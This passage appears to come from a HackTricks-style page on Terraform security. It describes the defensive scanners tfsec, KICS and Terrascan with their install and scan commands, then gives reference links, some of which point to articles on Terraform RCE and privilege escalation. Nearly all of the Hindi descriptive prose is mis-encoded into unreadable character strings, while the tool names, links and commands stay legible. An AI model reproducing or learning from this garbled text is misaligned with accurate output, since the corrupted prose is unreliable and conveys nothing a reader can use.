- тШБя╕П рд╕рднреА рдкреНрд░рдореБрдЦ (рдФрд░ рдХреБрдЫ рдЫреЛрдЯреЗ) рдХреНрд▓рд╛рдЙрдб рдкреНрд░рджрд╛рддрд╛рдУрдВ рдореЗрдВ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ
- тЫФ рд╕реИрдХрдбрд╝реЛрдВ рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдирд┐рдпрдо
- ЁЯкЖ рдореЙрдбреНрдпреВрд▓ (рд╕реНрдерд╛рдиреАрдп рдФрд░ рджреВрд░рд╕реНрде) рдХреЛ рд╕реНрдХреИрди рдХрд░рддрд╛ рд╣реИ
- тЮХ HCL рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде-рд╕рд╛рде рд╢рд╛рдмреНрджрд┐рдХ рдорд╛рдиреЛрдВ рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░рддрд╛ рд╣реИ
- тЖкя╕П Terraform рдХрд╛рд░реНрдпреЛрдВ рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░рддрд╛ рд╣реИ рдЬреИрд╕реЗ `concat()`
- ЁЯФЧ Terraform рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рдмреАрдЪ рд╕рдВрдмрдВрдзреЛрдВ рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░рддрд╛ рд╣реИ
- ЁЯз░ Terraform CDK рдХреЗ рд╕рд╛рде рд╕рдВрдЧрдд
- ЁЯЩЕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛-рдкрд░рд┐рднрд╛рд╖рд┐рдд Rego рдиреАрддрд┐рдпреЛрдВ рдХреЛ рд▓рд╛рдЧреВ (рдФрд░ рд╕рдЬрд╛рддрд╛) рд╣реИ
- ЁЯУГ рдХрдИ рдЖрдЙрдЯрдкреБрдЯ рдкреНрд░рд╛рд░реВрдкреЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ: рд╕реБрдВрджрд░ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ), JSON, SARIF, CSV, CheckStyle, JUnit, рдкрд╛рда, Gifред
- ЁЯЫая╕П рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдпреЛрдЧреНрдп (CLI рдзреНрд╡рдЬ рдФрд░/рдпрд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ)
- тЪб рдмрд╣реБрдд рддреЗрдЬрд╝, рд╡рд┐рд╢рд╛рд▓ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХреЛ рдЬрд▓реНрджреА рд╕реЗ рд╕реНрдХреИрди рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо
```bash
brew install tfsec
tfsec /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

рдЕрдкрдиреЗ **KICS** рджреНрд╡рд╛рд░рд╛ Checkmarx рдХреЗ рд╕рд╛рде рдЕрдкрдиреЗ рдЗрдиреНрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░-рдПрдЬрд╝-рдХреЛрдб рдХреЗ рд╡рд┐рдХрд╛рд╕ рдЪрдХреНрд░ рдореЗрдВ рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░рд┐рдпреЛрдВ, рдЕрдиреБрдкрд╛рд▓рди рдореБрджреНрджреЛрдВ рдФрд░ рдЗрдиреНрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдХреА рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдЬрд▓реНрджреА рдЦреЛрдЬреЗрдВред

**KICS** рдХрд╛ рдорддрд▓рдм рд╣реИ **K**eeping **I**nfrastructure as **C**ode **S**ecure, рдпрд╣ рдУрдкрди рд╕реЛрд░реНрд╕ рд╣реИ рдФрд░ рдХрд┐рд╕реА рднреА рдХреНрд▓рд╛рдЙрдб рдиреЗрдЯрд┐рд╡ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЗ рд▓рд┐рдП рдПрдХ рдЖрд╡рд╢реНрдпрдХ рдЙрдкрдХрд░рдг рд╣реИред
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

From the [**docs**](https://github.com/tenable/terrascan): Terrascan рдПрдХ рд╕реНрдерд┐рд░ рдХреЛрдб рд╡рд┐рд╢реНрд▓реЗрд╖рдХ рд╣реИ рдЬреЛ Infrastructure as Code рдХреЗ рд▓рд┐рдП рд╣реИред Terrascan рдЖрдкрдХреЛ рдпрд╣ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:

- рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рд▓рд┐рдП Infrastructure as Code рдХреЛ рдирд┐рд░реНрдмрд╛рдз рд░реВрдк рд╕реЗ рд╕реНрдХреИрди рдХрд░реЗрдВред
- рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░реЗрдВ рдЬреЛ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдмрджрд▓рд╛рд╡ рд▓рд╛рддреЗ рд╣реИрдВ, рдФрд░ рд╕реБрд░рдХреНрд╖рд┐рдд рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд╡рд╛рдкрд╕ рд▓реМрдЯрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред
- рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдФрд░ рдЕрдиреБрдкрд╛рд▓рди рдЙрд▓реНрд▓рдВрдШрдиреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВред
- рдХреНрд▓рд╛рдЙрдб рдиреЗрдЯрд┐рд╡ рдЗрдиреНрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдХреЛ рдкреНрд░рд╛рд╡рдзрд╛рди рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдЬреЛрдЦрд┐рдореЛрдВ рдХреЛ рдХрдо рдХрд░реЗрдВред
- рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдЪрд▓рд╛рдиреЗ рдпрд╛ рдЕрдкрдиреЗ CI\CD рдХреЗ рд╕рд╛рде рдПрдХреАрдХреГрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд▓рдЪреАрд▓рд╛рдкрди рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
```bash
brew install terrascan
```
## References

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)
- [https://github.com/offensive-actions/terraform-provider-statefile-rce](https://github.com/offensive-actions/terraform-provider-statefile-rce)
- [Terraform Cloud token abuse turns speculative plan into remote code execution](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)
- [Terraform Cloud permissions](https://developer.hashicorp.com/terraform/cloud-docs/users-teams-organizations/permissions)
- [Terraform Cloud API тАУ Show workspace](https://developer.hashicorp.com/terraform/cloud-docs/api-docs/workspaces#show-workspace)
- [AWS provider configuration](https://registry.terraform.io/providers/hashicorp/aws/latest/docs#provider-configuration)
- [AWS CLI тАУ OIDC role assumption](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-role.html#cli-configure-role-oidc)
- [GCP provider тАУ Using Terraform Cloud](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider_reference.html#using-terraform-cloud)
- [Terraform тАУ Sensitive variables](https://developer.hashicorp.com/terraform/tutorials/configuration-language/sensitive-variables)
- [Snyk Labs тАУ Gitflops: dangers of Terraform automation platforms](https://labs.snyk.io/resources/gitflops-dangers-of-terraform-automation-platforms/)

{{#include ../banners/hacktricks-training.md}}
